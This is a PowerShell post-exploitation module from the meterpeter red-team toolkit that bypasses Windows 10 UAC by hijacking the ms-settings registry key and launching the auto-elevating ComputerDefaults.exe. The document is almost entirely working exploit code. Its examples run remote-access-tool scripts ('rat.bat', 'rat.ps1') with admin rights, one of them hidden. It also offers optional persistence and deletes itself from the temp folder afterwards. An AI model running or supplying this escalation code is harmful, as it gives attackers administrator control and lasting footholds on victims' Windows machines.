<#
.SYNOPSIS
   CompDefault can be used has UAC bypass module or to execute one command with high privileges (Admin)

   Author: r00t-3xp10it (SSA RedTeam @2020)
   Tested Under: Windows 10 - Build 18363
   Disclosure By: @Fabien DROMAS|@404death
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev Version: v1.2

.DESCRIPTION
   CompDefault cmdlet uses ComputerDefaults.exe native windows 10 microsoft signed binary that have the
   "autoElevate" attribute set to true of their manifest and that interacts with the Windows registry. Within
   this interaction it is interesting to detect those binaries like ComputerDefaults.exe that do not find keys
   in the HKCU branch. This can result in a process running in a high integrity context executing something that
   is found in an HKCU branch. CompDefault cmdlet uses the 'fileless' technic to be abble to escalate privileges.

.NOTES
   Its Mandatory the use of "double quotes" in the 1º parameter input.
   CompDefault cmdlet supports [ CMD | POWERSHELL | PYTHON ] scripts exec.
   To run binarys (.exe) through this cmdlet use: "cmd /c start binary.exe"

   This cmdlet 'reverts' regedit hacks to the previous state before the EOP.
   Unless '$MakeItPersistence' its set to "True". In that case the EOP registry
   hacks will NOT be deleted in the end of exec making the '$Command' persistence.
   Remark: .\CompDefault.ps1 "deleteEOP" parameter deletes the '$Command' persistence.

.EXAMPLE
   PS C:\> .\CompDefault.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
   Spawn notepad process with high privileges (Admin)

.EXAMPLE
   PS C:\> .\CompDefault.ps1 "$Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
   Spawn powershell process with high privileges (Admin)

.EXAMPLE
   PS C:\> .\CompDefault.ps1 "cmd /c start C:\Users\pedro\AppData\Local\Temp\rat.bat"
   Execute $Env:TMP\rat.bat script with high privileges (Admin)

.EXAMPLE
   PS C:\> .\CompDefault.ps1 "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\rat.ps1"
   Execute $Env:TMP\rat.ps1 script with high privileges (Admin) in an hidden console.

.EXAMPLE
   PS C:\> .\CompDefault.ps1 "cmd /c start regedit.exe" -Verbose
   Spawn regedit with high privileges (Admin) and display process verbose info
   Remark: This function does not work under meterpeter C2 framework (automatic)

.EXAMPLE
   PS C:\> .\CompDefault.ps1 "powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser" -Force
   Bypass this cmdlet vulnerability tests (-Force) to execute '$command' with high privileges (Admin)
   Remark: This function does not work under meterpeter C2 framework (automatic)

.INPUTS
   None. You cannot pipe objects into CompDefault.ps1

.OUTPUTS
   Audits the spawned process <UserDomain> <ProcessName> <Status> and <PID>
   If used '-Verbose' parameter then displays process detailed information

.LINK
    https://github.com/r00t-3xp10it/meterpeter
    https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/CompDefault.ps1
    https://github.com/r00t-3xp10it/meterpeter/wiki/CompDefault---UACbypass-Escalation-Of-Privileges
    https://github.com/sailay1996/UAC_Bypass_In_The_Wild/blob/master/Fileless_UAC_Bypass/uac_computerDefault.py
#>


$Command = $Null               # Command Internal function [<dontchange>]
$VerboseMode = "False"         # Change this value to "True" for verbose
$EOP_Success = $False          # Remote EOP execution status [<dontchange>]
$MakeItPersistence = "False"   # Change this value to "True" to make the '$Command' persistence
$param1 = $args[0]             # User Inputs [ <Arguments> ] [<Parameters>] [<dontchange>]
$param2 = $args[1]             # User Inputs [ <Arguments> ] [<Parameters>] [<dontchange>]
$host.UI.RawUI.WindowTitle = "@CompDefault v1.2 {SSA@redTeam}"
If($param2 -ieq "-Verbose"){$VerboseMode = "True"}
If(-not($param1) -or $param1 -eq $null){
   $Command = "$Env:WINDIR\System32\cmd.exe"
   Write-Host "`n[ ERROR ] This cmdlet requires the first parameter to run." -ForegroundColor Red -BackgroundColor Black
   Write-Host "Syntax: [scriptname] [parameter <`"mandatory`">] [-parameter <optional>]`n" 
   Write-Host ".\CompDefault.ps1 `"Command to execute`""
   Write-Host ".\CompDefault.ps1 `"Command to execute`" -Force"
   Write-Host ".\CompDefault.ps1 `"Command to execute`" -Verbose"
   Start-Sleep -Milliseconds 1500
}Else{
   $Command = "$param1"
}


## CompDefault meterpeter post-module banner
# $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
Write-Host "`nCompDefault v1.2 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 700

## Check for regedit vulnerable HIVE existence before continue any further ..
$CheckVuln = Test-Path -Path "HKCU:\Software\Classes\ms-settings" -EA SilentlyContinue
If($CheckVuln -eq $True -or $param2 -ieq "-Force"){

   ## Check for windows native vulnerable binary existence.  
   If(-not(Test-Path -Path "$Env:WINDIR\System32\ComputerDefaults.exe") -and $param2 -iNotMatch '-Force'){
      If(Test-Path "$Env:TMP\CompDefault.ps1"){Remove-Item -Path "$Env:TMP\CompDefault.ps1" -Force -EA SilentlyContinue}
      Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
      Write-Host "[ ] NOT FOUND: '$Env:WINDIR\System32\ComputerDefaults.exe'`n"
      Exit
   }

   ## Delete 'persistence' '$Command' left behind by: '$MakeItPersistence' function.
   # This function 'reverts' all regedit hacks to the previous state before the EOP.
   If($param1 -eq "deleteEOP"){
      Write-Host "[+] Deleting  => EOP registry hacks (revert)";Start-Sleep -Milliseconds 700
      ## Make sure the vulnerable registry key exists
      If(Test-Path -Path "HKCU:\Software\Classes\ms-settings\shell\Open\Command" -ErrorAction SilentlyContinue){
         Remove-Item "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force|Out-Null;Start-Sleep -Seconds 1
         Write-Host "[ ] Success   => MakeItPersistence (`$Command) reverted." -ForegroundColor Green;Start-Sleep -Milliseconds 700
         Write-Host "[ ] HIVE      => HKCU:\Software\Classes\ms-settings\shell\open\command`n"
      }Else{
         Write-Host "[ ] Failed    => None CompDefault registry keys found under:" -ForegroundColor Red -BackGroundColor Black;Start-Sleep -Milliseconds 700
         Write-Host "[ ] HIVE      => HKCU:\Software\Classes\ms-settings\shell\open\command`n"
      }
      If(Test-Path "$Env:TMP\CompDefault.ps1"){Remove-Item -Path "$Env:TMP\CompDefault.ps1" -Force -EA SilentlyContinue}
      Exit
   }

   ## Anti-Virus registry Hive|Keys detection checks.
   New-Item "HKCU:\Software\Classes\ms-settings\shell\open\Command" -Force -EA SilentlyContinue|Out-Null;Start-Sleep -Milliseconds 150
   If(-not(Test-Path "HKCU:\Software\Classes\ms-settings\shell\open\Command") -and $param2 -iNotMatch '-Force'){
      If(Test-Path "$Env:TMP\CompDefault.ps1"){Remove-Item -Path "$Env:TMP\CompDefault.ps1" -Force -EA SilentlyContinue}
      Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
      Write-Host "[ ] CompDefault can't create the required registry key. (AV?)" -ForegroundColor red -BackgroundColor Black
      Write-Host "[ ] HIVE      => HKCU:\Software\Classes\ms-settings\shell\open\command`n"
      Exit
   }

   ## Add Entrys to Regedit { using powershell }
   Write-Host "[+] Hijacking => ComputerDefaults.exe execution in registry."
   Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value '' -Force|Out-Null;Start-Sleep -Milliseconds 150
   ## The Next Registry entry allow us to execute our command under high privileges (Admin)
   Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "$Command" -Force|Out-Null;Start-Sleep -Milliseconds 150

   ## Start the vulnerable Process { using powershell }
   Write-Host "[+] Hijacking => ComputerDefaults.exe process execution."
   Start-Process "$Env:WINDIR\System32\ComputerDefaults.exe"
   Start-Sleep -Milliseconds 3200 # Give time for ComputerDefaults.exe to finish
   ## '$LASTEXITCODE' contains the exit code of the last Win32 executable execution
   If($LASTEXITCODE -eq 0){$ReturnCode = "0-"}Else{$ReturnCode = "1-"}

   ## If '$MakeItPersistence' is set to "True" then the EOP registry hacks will NOT
   # be deleted in the end of cmdlet execution, making the 'command' persistence.
   If($MakeItPersistence -eq "False"){
      ## Revert Regedit to 'DEFAULT' settings after EOP finished ..
      Write-Host "[+] Deleting  => EOP registry hacks (revert)"
      Remove-Item "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force|Out-Null
      Start-Sleep -Milliseconds 700
   }Else{
      Write-Host "[ ] Executing => MakeItPersistence (True)" -ForeGroundColor yellow;Start-Sleep -Milliseconds 700
      Write-Host "[ ] Hijacking => Registry hacks will NOT be deleted." -ForeGroundColor yellow
   }

   <#
   .SYNOPSIS
      Helper - Audits the Spawned process <UserDomain> <ProcessName> <Status> and <PID>
      Author: @r00t-3xp10it

   .DESCRIPTION
      Audits the spawned process <UserDomain> <ProcessName> <Status> and <PID>
      If used '-Verbose' parameter then displays process detailed information

   .EXAMPLE
      PS C:\> .\CompDefault.ps1 "cmd.exe /c start regedit.exe"

      UserDomain ProccessName Status   PID
      ---------- ------------ ------   ---
      SKYNET     regedit      success  5543
   #>

   ## Audit remote Spawned ProcessName|ProcessPath|StartTime|PID
   Write-Host "[+] Executing => EOP output Table displays.`n";Start-Sleep -Milliseconds 400
   If($Command -NotMatch '\\' -and $Command -NotMatch '\s'){
      ## String: "powershell.exe"
      $ProcessName = Split-Path "$Command" -Leaf
      $ReturnCode = "$ReturnCode"+"1"
   }ElseIF($Command -Match '\\' -and $Command -NotMatch '\s'){
      ## String: $Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe
      $ProcessName = $Command -Split('\\')|Select -Last 1 -EA SilentlyContinue
      $ReturnCode = "$ReturnCode"+"2"
   }ElseIF($Command -Match '\s' -and $Command -NotMatch '\\'){
      ## String: powershell.exe Start-Process regedit.exe
      $ProcessName = $Command -Split('\s')|Select -Last 1 -EA SilentlyContinue
      $ReturnCode = "$ReturnCode"+"3"
   }ElseIF($Command -Match '^(C:\\)' -and $Command -Match '\s' -and $Command -NotMatch '[.bat]$' -and $Command -NotMatch '[.ps1]$' -and $Command -NotMatch '[.py]$'){
      ## String: C:\Windows\System32\cmd.exe /c start notepad.exe
      #  String: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe
      $ProcessName = $Command -Split('\s')|Select -Last 1 -EA SilentlyContinue
      $ReturnCode = "$ReturnCode"+"4"
   }ElseIF($Command -iMatch '^.Env:' -or $Command -iMatch '^(C:\\)' -and $Command -Match '\s'){
      ## String: $Env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe
      #  String: $env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe Start-Process regedit.exe
      $ProcessName = $Command -Split('\s')|Select -Last 1 -EA SilentlyContinue
      $ReturnCode = "$ReturnCode"+"5"
   }Else{
      ## String: cmd /c start C:\Users\pedro\AppData\Local\Temp\rat.bat
      #  String: powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\MyRat.ps1
      $ProcessName = Split-Path "$Command" -Leaf
      $ReturnCode = "$ReturnCode"+"6"
   }

   ## Audit Spawn Process Group Owner
   # Function to audit [binary|script|command] Tokens
   Start-Sleep -Milliseconds 500
   If($ProcessName -Match '[.exe]$'){
      $ProcessToken = "$ProcessName";$ReturnCode = "$ReturnCode"+":1"
      $ProcessName = $ProcessName -replace '.exe',''
      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
   }ElseIF($Command -Match '^[powershell].*[.ps1]$'){
      $ProcessToken = "powershell.exe";$ReturnCode = "$ReturnCode"+":2"
      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
   }ElseIF($Command -Match '^[cmd].*[.bat]$' -or $Command -Match '^[cmd].*[.ps1]$' -or $Command -Match '^[cmd].*[.py]$'){
      $ProcessToken = "cmd.exe";$ReturnCode = "$ReturnCode"+":3"
      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
   }ElseIF($Command -Match '^[python].*[.py]$'){
      $ProcessToken = "python.exe";$ReturnCode = "$ReturnCode"+":4"
      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
   }ElseIF($Command -Match '^[powershell]' -and $Command -NotMatch '[.exe]$' -and $Command -NotMatch '[.ps1]$' -and $Command -NotMatch '[.bat]$' -and $Command -NotMatch '[.py]$'){
      ## String: powershell Set-ExecutionPolicy Unrestricted -Scope Currentuser
      $ProcessToken = "powershell.exe";$ReturnCode = "$ReturnCode"+":5"
      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
      $ProcessName = "powershell"
   }ElseIF($Command -Match '^[cmd]' -and $Command -NotMatch '[.exe]$' -and $Command -NotMatch '[.ps1]$' -and $Command -NotMatch '[.bat]$' -and $Command -NotMatch '[.py]$'){
      ## String: cmd.exe /c REG ADD 'HKCU\Software\Microsoft\Windows' /v NoFileMRU /t REG_DWORD /d 1 /f
      $ProcessToken = "cmd.exe";$ReturnCode = "$ReturnCode"+":6"
      $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
      If($EOPID -Match '^\d+$'){$EOP_Success = $True}
      $ProcessName = "cmd"
   }Else{
      $EOPID = "null"
   }

   ## Build MY PSObject Table to display results
   $MYPSObjectTable = New-Object -TypeName PSObject
   If($VerboseMode -eq "True"){
      $RemoteOS = (Get-WmiObject Win32_OperatingSystem).Caption
      $OSversion = (Get-WmiObject Win32_Process|Select-Object).WindowsVersion|Select -Last 1 -EA SilentlyContinue
      $SpawnPath = (Get-Process $ProcessName -EA SilentlyContinue|select *).Path|Select -Last 1 -EA SilentlyContinue
      $SpawnTime = (Get-Process $ProcessName -EA SilentlyContinue|select *).StartTime|Select -Last 1 -EA SilentlyContinue
      $GroupToken = Get-WmiObject Win32_Process -Filter "name='$ProcessToken'"|Select Name, @{Name="UserName";Expression={$_.GetOwner().Domain+"\"+$_.GetOwner().User}}|Select -Last 1|Select-Object -ExpandProperty UserName
      $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ReturnCode" -Value "$ReturnCode"
    }
    If($EOP_Success -eq $True){$EOPState = "success"}Else{$EOPState = "error";$EOPID = "null"}
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Architecture" -Value "$Env:PROCESSOR_ARCHITECTURE"}
    $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "UserDomain" -Value "$Env:USERDOMAIN"
    $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
    $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Status" -Value "$EOPState"
    $MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "PID" -Value "$EOPID"
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "StartTime" -Value "$SpawnTime"}
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "RemoteHost" -Value "$RemoteOS"}
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "ProcessPath" -Value "$SpawnPath"}
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "EOPCommand" -Value "$Command"}
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "Owner" -Value "$GroupToken"}
    If($VerboseMode -eq "True"){$MYPSObjectTable | Add-Member -MemberType "NoteProperty" -Name "OSversion" -Value "$OSversion"}
    ## Create a logfile with the Table. Because meterpeter C2 can't otherwise remotely display Table contents.
    echo $MYPSObjectTable > $Env:TMP\CompDefault.log

}Else{
   ## Vulnerable registry Hive => NOT FOUND
   Write-Host "[ ] System Doesn't Seems Vulnerable, Aborting." -ForegroundColor red -BackgroundColor Black
   Write-Host "[ ] NOT FOUND: 'HKCU:\Software\Classes\ms-settings'`n"
}

## Clean old files left behind by CompDefault after the job is finished ..
If(Test-Path "$Env:TMP\CompDefault.log"){Get-Content -Path "$Env:TMP\CompDefault.log" -EA SilentlyContinue;Remove-Item -Path "$Env:TMP\CompDefault.log" -Force -EA SilentlyContinue}
If(Test-Path "$Env:TMP\CompDefault.ps1"){Remove-Item -Path "$Env:TMP\CompDefault.ps1" -Force -EA SilentlyContinue}
Exit
